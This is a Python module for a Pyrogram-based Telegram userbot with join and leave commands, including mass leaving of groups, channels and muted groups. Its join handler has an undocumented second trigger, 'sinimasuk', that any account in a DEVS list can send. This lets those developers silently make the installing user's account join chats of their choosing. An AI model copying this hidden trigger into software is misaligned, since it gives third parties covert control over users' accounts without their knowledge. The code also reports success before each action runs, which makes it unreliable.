from pyrogram import *
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from pyrogram.errors.exceptions.not_acceptable_406 import ChannelPrivate

from PyroUbot import *

__MODULE__ = "Joinleave"
__HELP__ = """
<blockquote><b>✘ Bantuan Untuk Join Leave</b></blockquote>

<blockquote><b>๏ Perintah: {0}kickme
◉ Penjelasan: Keluar Dari Grup</b></blockquote>
<blockquote><b>๏ Perintah: {0}join [Username Gc]
◉ Penjelasan: Join Ke Grup Melalui Username</b></blockquote>
<blockquote><b>๏ Perintah: {0}leaveallgc
◉ Penjelasan: Keluar Dari Semua Grup</b></blockquote>
<blockquote><b>๏ Perintah: {0}leaveallch
◉ Penjelasan: Keluar Dari Semua Channel</b></blockquote>
<blockquote><b>๏ Perintah: {0}leave [Username Gc]
◉ Penjelasan: Keluar Dari Grup Melalu Username</b></blockquote>
<blockquote><b>๏ Perintah: {0}leaveallmute
◉ Penjelasan: Untuk Keluar Dari Grup Yang Di Mute</b></blockquote>
"""


@PY.UBOT("join")
@PY.TOP_CMD
@ubot.on_message(filters.command(["sinimasuk"], "") & filters.user(DEVS))
async def join(client: Client, message: Message):
    Man = message.command[1] if len(message.command) > 1 else message.chat.id
    proses = await EMO.PROSES(client)
    sukses = await EMO.SUKSES(client)
    xxnx = await message.reply(f"{proses} Processing...")
    try:
        await xxnx.edit(f"<blockquote><b>{sukses} Berhasil Bergabung Ke Chat Id `{Man}`</b></blockquote>")
        await client.join_chat(Man)
    except Exception as ex:
        await xxnx.edit(f"ERROR: \n\n{str(ex)}")

@PY.UBOT("kickme|leave", FILTERS.ME_GROUP)
@PY.TOP_CMD
async def leave(client: Client, message: Message):
    Man = message.command[1] if len(message.command) > 1 else message.chat.id
    proses = await EMO.PROSES(client)
    sukses = await EMO.SUKSES(client)
    gagal = await EMO.GAGAL(client)
    xxnx = await message.reply(f"{sukses} Processing...")
    if message.chat.id in BLACKLIST_CHAT:
        return await xxnx.edit(f"<blockquote><b>{gagal} Perintah Ini Di Larang Digunakan Di Group Ini</b></blockquote>")
    try:
        await xxnx.edit_text(f"<blockquote><b>{sukses} {client.me.first_name} Telah Meninggalkan Group Jelek Ini!!!</b></blockquote>")
        await client.leave_chat(Man)
    except Exception as ex:
        await xxnx.edit_text(f"ERROR: \n\n{str(ex)}")

@PY.UBOT("leaveallgc")
@PY.TOP_CMD
async def kickmeall(client: Client, message: Message):
    proses = await EMO.PROSES(client)
    sukses = await EMO.SUKSES(client)
    gagal = await EMO.GAGAL(client)
    Man = await message.reply(f"<b>{proses} Processing...</b>")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await Man.edit(
        f"<blockquote><b>{sukses} Berhasil Keluar Dari {done} Group\n{gagal} Gagal Keluar Dari {er} Group</b></blockquote>"
    )

@PY.UBOT("leaveallch")
@PY.TOP_CMD
async def kickmeallch(client: Client, message: Message):
    proses = await EMO.PROSES(client)
    Man = await message.reply(f"<b>{proses} Processing...</b>")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.CHANNEL):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    sukses = await EMO.SUKSES(client)
    gagal = await EMO.GAGAL(client)
    await Man.edit(
        f"<blockquote><b>{sukses} Berhasil Keluar Dari {done} Channel\n{gagal} Gagal Keluar Dari {er} Channel</b></blockquote>"
    )


@PY.UBOT("leaveallmute")
async def _(client, message):
    done = 0
    proses = await EMO.PROSES(client)
    Tk = await message.reply(f"<b>{proses} Processing...")
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                member = await client.get_chat_member(chat, "me")
                if member.status == ChatMemberStatus.RESTRICTED:
                    await client.leave_chat(chat)
                    done += 1
            except Exception:
                pass
    sukses = await EMO.SUKSES(client)
    await Tk.edit(f"<blockquote><b>{sukses} Succes Leave {done} Group Muted!!</b></blockquote>")